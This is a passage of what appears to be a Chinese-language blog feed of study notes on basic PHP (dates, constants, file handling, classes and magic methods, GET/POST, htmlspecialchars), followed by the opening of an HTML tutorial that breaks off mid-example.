格式化时间日期函数</span><br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y/m/d h:i:s&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-comment">// time()时间戳函数</span><br><span class="hljs-variable">$t</span> = <span class="hljs-title function_ invoke__">time</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$t</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-comment">// getdate() 当前时间的一个数组表示</span><br><span class="hljs-variable">$k</span> = <span class="hljs-title function_ invoke__">getdate</span>();<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$k</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$k</span>[<span class="hljs-number">0</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>; <span class="hljs-comment">// 取时间戳</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$k</span>[<span class="hljs-string">&#x27;hours&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br><br><span class="hljs-title function_ invoke__">date_format</span>()将日期时间对象转换为字符串<br><br>strtotime（<span class="hljs-keyword">string</span>类型），可以把<span class="hljs-keyword">string</span>类型转换成时间戳<br><br><span class="hljs-title function_ invoke__">date_create</span>()来创建一个日期时间对象<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><h3 id="定义常量"><a href="#定义常量" class="headerlink" title="定义常量"></a>定义常量</h3><p>方式1：define(‘常量名’,’常量’);</p><p>方式2：const 常量名 &#x3D; 常量值;</p><p>区别：</p><p>1.define定义的常量名可以是特殊符号，若是特殊符号，则需要用echo constant（’ 常量名’）来打印；const 不能用特殊符号；</p><p>2.const不能用于if判断中</p><p>3.const用于类成员变量的定义，define不可用</p><h3 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h3><p>系统自带的常量，可直接使用</p><p><code>PHP_VERSION</code>：当前 PHP 解析器的版本。</p><p><code>PHP_OS</code>：服务器的操作系统。</p><p><code>PHP_INT_MAX</code>：最大的整数值。</p><p><code>E_ERROR</code>、<code>E_WARNING</code>、<code>E_PARSE</code> 等：错误报告级别</p><h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>魔术常量值随着它们在代码中的位置改变而改变</p><p>双下划线+常量名+双下划线</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__LINE__</span>文件中的当前行号<br><span class="hljs-emphasis">__FILE__</span>文件的完整路径和文件名<br><span class="hljs-emphasis">__DIR__</span>文件所在的目录<br><span class="hljs-emphasis">__FUNCTION__</span>返回该函数被定义时的名字<br><span class="hljs-emphasis">__CLASS__</span>返回该类被定义时的名<br><span class="hljs-emphasis">__TRAIT__</span>Trait 的名字<br><span class="hljs-emphasis">__METHOD__</span>返回该方法被定义时的名字（区分大小写）<br><span class="hljs-emphasis">__NAMESPACE__</span>当前命名空间的名称（区分大小写）<br></code></pre></td></tr></table></figure><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="文件和目录操作"><a href="#文件和目录操作" class="headerlink" title="文件和目录操作"></a>文件和目录操作</h3><p>文件写入：</p><p>file_put_contents(文件名)<br>如果找不到该文件，会自动创建，先清空再写入内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span> = file_put_contents(<span class="hljs-string">&#x27;1.txt&#x27;</span>, <span class="hljs-string">&#x27;Hello&#x27;</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>文件读取：</p><p>readfile(文件名);读取文件中的内容打印出来 返回值为文件内容的长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span> = readfile(<span class="hljs-string">&#x27;1.txt&#x27;</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.<span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>file_get_contents()读取文件内容 &#x2F;&#x2F; 绝对路径 相对路径 网址路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span> = file_get_contents(<span class="hljs-string">&#x27;1.txt&#x27;</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>fopen()打开文件</p><p>fwrite()写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span> = fopen(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-built_in">echo</span> gettype(<span class="hljs-variable">$a</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>fread()读取文件</p><p>fgets()读取一行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$b</span> = fread(<span class="hljs-variable">$a</span>,3);<br><br><span class="hljs-variable">$b</span> = fgets(<span class="hljs-variable">$a</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$b</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="文件模式"><a href="#文件模式" class="headerlink" title="文件模式"></a>文件模式</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-comment">// r+读写模式</span><br>$a = <span class="hljs-keyword">fopen</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;r+&#x27;</span>);<br>$b = <span class="hljs-keyword">fwrite</span>($a,<span class="hljs-string">&#x27;aaa&#x27;</span>); <span class="hljs-comment">// 返回写入长度 覆盖原内容</span><br>echo $b.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">fclose</span>($a);<br><br><span class="hljs-comment">// w和w+模式都会先将文件清空</span><br><br><span class="hljs-comment">// a模式 追加模式 不会覆盖原内容</span><br></code></pre></td></tr></table></figure><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>include函数和require函数</p><p>include(‘文件名’)：</p><p>返回一个警告<br>如果引入出错，代码继续向下执行，通常用于动态包含<br>include(‘…’);</p><p>require(‘文件名’)：</p><p>如果引入出错，代码就不会继续向下执行<br>require(‘include等文件包含函数.php’);</p><p>include_once函数引入 除了原有功能还会once检测，如果文件曾经已经被包含过，不再包含</p><p>推荐使用require</p><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><p>具体资料<a href="https://www.runoob.com/php/php-oop.html">https://www.runoob.com/php/php-oop.html</a></p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>定义了一件事物的抽象特点。</p><p>类的定义包含了数据的形式以及对数据的操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fruit</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$color</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_name</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_name</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><p>类创建后，我们可以使用 <strong>new</strong> 运算符来实例化该类的对象</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-built_in">$apple</span> = <span class="hljs-keyword">new</span> Fruit()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="调用成员方法"><a href="#调用成员方法" class="headerlink" title="调用成员方法"></a>调用成员方法</h3><p>在实例化对象后，我们可以使用该对象调用成员方法，该对象的成员方法只能操作该对象的成员变量</p><p>$对象名-&gt;方法名(参数)</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">apple</span>-&gt;</span>set_name(<span class="hljs-string">&quot;Apple&quot;</span>);<br>$<span class="hljs-function"><span class="hljs-title">banana</span>-&gt;</span>set_name(<span class="hljs-string">&quot;Banana&quot;</span>);<br>$<span class="hljs-function"><span class="hljs-title">apple</span>-&gt;</span>say();<br></code></pre></td></tr></table></figure><h3 id="类的方法和属性"><a href="#类的方法和属性" class="headerlink" title="类的方法和属性"></a>类的方法和属性</h3><p>如果想要调用或者对类的成员变量进行赋值需要用$this-&gt;变量名</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span><span class="hljs-keyword">name</span> = $<span class="hljs-keyword">name</span>;<br></code></pre></td></tr></table></figure><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。</p><ul><li><strong>public（公有）：</strong>公有的类成员可以在任何地方被访问。</li><li><strong>protected（受保护）：</strong>受保护的类成员则可以被其自身以及其子类和父类访问。</li><li><strong>private（私有）：</strong>私有的类成员则只能被其定义所在的类访问。</li></ul><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>构造函数和析构函数</p><p>__construct()类构造函数</p><ol><li>在创建一个新对象是，他会自动调用</li><li>他可以用来初始化对象的属性或执行的其他必要的操作</li><li>没有返回值</li></ol><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$age</span>=<span class="hljs-number">1</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    person::<span class="hljs-variable">$sum</span>++;<br>    <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-variable">$age</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>__destruct()类的析构函数 不能加上任何参数</p><p>1.在对象销毁时会自动调用</p><p>2.可以用来执行一些清理操作，例如释放资源或关闭数据库连接</p><p>3当对象不在被引用或脚本执行结束前，析构函数会被自动调用</p><hr><p>其他魔术方法：</p><p>__call()在对象中调用一个不可访问方法时调用</p><p>当调用一个不可访问方法或者不存在的方法时会执行__call()方法</p><hr><p>__callstatic()静态调用</p><p>调用时格式：对象名::方法名(参数)</p><hr><p>__unset()方法和 unset函数 ：当对不可访问属性调用unset()时被调用</p><p>可在对象外面删除对象的属性</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;当测定私有成员<span class="hljs-subst">&#123;$content&#125;</span>时,自动调用&quot;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$c</span>-&gt;name); <span class="hljs-comment">// 删除c对象中的私有变量name</span><br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">say</span>();<br></code></pre></td></tr></table></figure><hr><p>__tostring()方法调用后可直接echo输出对象</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;这个人的名字叫<span class="hljs-subst">&#123;$this-&gt;name&#125;</span>.年龄为<span class="hljs-subst">&#123;$this-&gt;age&#125;</span>.&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">personchild</span>(<span class="hljs-string">&quot;奶龙&quot;</span>,<span class="hljs-number">100</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>;<br></code></pre></td></tr></table></figure><hr><p>__set()方法可给私有属性赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$PName</span>, <span class="hljs-variable">$Value</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$PName</span> = <span class="hljs-variable">$Value</span>;<br>&#125;<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-string">&quot;小红&quot;</span>; <span class="hljs-comment">// 给私有属性赋值</span><br><span class="hljs-variable">$a</span>-&gt;age = <span class="hljs-number">16</span>;<br></code></pre></td></tr></table></figure><hr><p>__clone方法和clone关键字用来复制对象产生一个副本</p><p>如果只需要直接复制就不需要再类中定义clone方法</p><p>如果在clone时需要重新赋初值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)//定义<span class="hljs-title">__clone</span>方法</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;调用__clone方法&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;age = -<span class="hljs-number">100</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&quot;吴颖昇&quot;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$d</span>;<span class="hljs-comment">//调用clone方法复制对象</span><br></code></pre></td></tr></table></figure><hr><p>__get()方法可获取私有属性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$PName</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$PName</span>==<span class="hljs-string">&quot;age&quot;</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;age;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">person</span>(<span class="hljs-string">&quot;小明&quot;</span>,<span class="hljs-number">60</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;姓名&quot;</span>.<span class="hljs-variable">$a</span>-&gt;name.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// 直接访问私有属性name 自动调用__get方法可以间接获取</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;年龄&quot;</span>.<span class="hljs-variable">$a</span>-&gt;age.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// 直接调用__get方法 根据对象本身的情况返回不同的值</span><br></code></pre></td></tr></table></figure><h3 id="static静态变量和self"><a href="#static静态变量和self" class="headerlink" title="static静态变量和self"></a>static静态变量和self</h3><p>定义：public static $变量名</p><p>调用：self::变量名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$gender</span>;<br><span class="hljs-built_in">self</span>::<span class="hljs-variable">$gender</span> = <span class="hljs-string">&#x27;male&#x27;</span>;<br></code></pre></td></tr></table></figure><hr><p>类常量</p><p>用const去定义常量，调用方式和static类似，用self调用，唯一区别是类常量不可修改</p><hr><p>static静态方法定义：</p><p><img src="/../image/%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95.png"></p><p>调用静态方法:</p><p><img src="/../image/%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8.png"></p><h3 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h3><p>PHP中使用关键字<strong>extends</strong>来继承一个类,且PHP不支持多继承</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Parent</span> </span><br>&#123;<br>   <span class="hljs-comment">// 代码部分</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="类的方法重写和属性改写"><a href="#类的方法重写和属性改写" class="headerlink" title="类的方法重写和属性改写"></a>类的方法重写和属性改写</h3><p>方法重写 (就是改写父类覆盖)<br>如果从父类继承的方法不能满足子类的需求，可以对其进行改写<br>这个过程叫方法的覆盖（override），也称为方法的重写。</p><p>直接在子类内部改写方法或属性。</p><p>final关键字（在不想被改写的类或类的方法前加final）</p><ul><li>防止类被改写</li><li>防止类的方法被重写。</li></ul><p><strong>final不能用于属性</strong></p><hr><p>调用父类中被重写的方法</p><p>parent关键字<br>parent::方法();</p><h2 id="网络请求"><a href="#网络请求" class="headerlink" title="网络请求"></a>网络请求</h2><h3 id="POST和GET"><a href="#POST和GET" class="headerlink" title="POST和GET"></a>POST和GET</h3><p>$_GET 变量：</p><p>预定义的 $_GET 变量用于收集来自 method&#x3D;”get” 的表单中的值。</p><p>从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制。</p><hr><p>$_POST 变量：</p><p>预定义的 $_POST 变量用于收集来自 method&#x3D;”post” 的表单中的值。</p><p>从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制。</p><hr><p>$<em>SERVER[“PHP_SELF”] 变量</em></p><p>_$_SERVER[“PHP_SELF”]是超级全局变量，返回当前正在执行脚本的文件名，与 document root相关。</p><p>所以， $_SERVER[“PHP_SELF”] 会发送表单数据到当前页面，而不是跳转到不同的页面</p><hr><p>$_REQUEST变量包含了$_GET，$__POST和$_COOKLE的内容</p><p>htmlspecialchars()方法  </p><p>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。以避免在HTML文档中引起解析错误或安全漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">&amp; （和号） 成为 <span class="hljs-symbol">&amp;amp;</span><br>&quot; （双引号） 成为 <span class="hljs-symbol">&amp;quot;</span><br>&#x27; （单引号） 成为 <span class="hljs-symbol">&amp;#039;</span><br>&lt; （小于） 成为 <span class="hljs-symbol">&amp;lt;</span><br>&gt; （大于） 成为 <span class="hljs-symbol">&amp;gt;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML学习笔记</title>
      <link href="/2024/12/25/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/12/25/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML简介"><a href="#HTML简介" class="headerlink" title="HTML简介"></a>HTML简介</h1><p>   HTML 是用来描述网页的一种语言。</p><ul><li><p>HTML 指的是超文本标记语言: <strong>H</strong>yper<strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage</p></li><li><p>HTML 不是一种编程语言，而是一种<strong>标记</strong>语言</p></li><li><p>标记语言是一套<strong>标记标签</strong> (markup tag)</p></li><li><p>HTML 使用标记标签来<strong>描述</strong>网页</p></li><li><p>HTML 文档包含了HTML <strong>标签</strong>及<strong>文本</strong>内容</p></li><li><p>HTML文档也叫做 <strong>web 页面</strong></p><h1 id="HTML的学习"><a href="#HTML的学习" class="headerlink" title="HTML的学习"></a>HTML的学习</h1><h2 id="基础结构和语法"><a href="#基础结构和语法" class="headerlink" title="基础结构和语法"></a>基础结构和语法</h2><h3 id="基础结构例子"><a href="#基础结构例子" class="headerlink" title="基础结构例子"></a>基础结构例子</h3><p><img src="/../image/HTML%E4%BE%8B%E5%AD%90.png"></p></li></ul><h3 id="DOCTYPE"><a href="#DOCTYPE" class="headerlink" title="DOCTYPE"></a>DOCTYPE</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> //声明为 HTML5 文档 需要写在首行<br></code></pre></td></tr></table></figure><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">无属性标签 <span class="hljs-tag">&lt;<span class="hljs-name">标签名</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">标签名</span>&gt;</span><br><br>有属性标签 <span class="hljs-tag">&lt;<span class="hljs-name">标签名</span> <span class="hljs-attr">属性名</span>=<span class="hljs-string">&quot;属性值&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">标签名</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span> 表示是一个html网页<br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span> 头部信息，如果需要使用css样式要写在里面<br> <br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> 身体部分，主要html代码要写在里面<br></code></pre></td></tr></table></figure><h3 id="自写html代码记录"><a href="#自写html代码记录" class="headerlink" title="自写html代码记录"></a>自写html代码记录</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 定义标题用&lt;h1&gt;标签，定义图片用&lt;img&gt;标签 --&gt;</span><br><span class="hljs-comment">&lt;!-- 定义样式在标签上使用style属性 --&gt;</span><br><span class="hljs-comment">&lt;!-- 文档申明，表示html5 --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 当前语言是英文 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 告诉浏览器采用utf-8 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 解决IE浏览器兼容性问题 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 网页标题，显示在浏览器的标签页中 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Hello HTML<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: 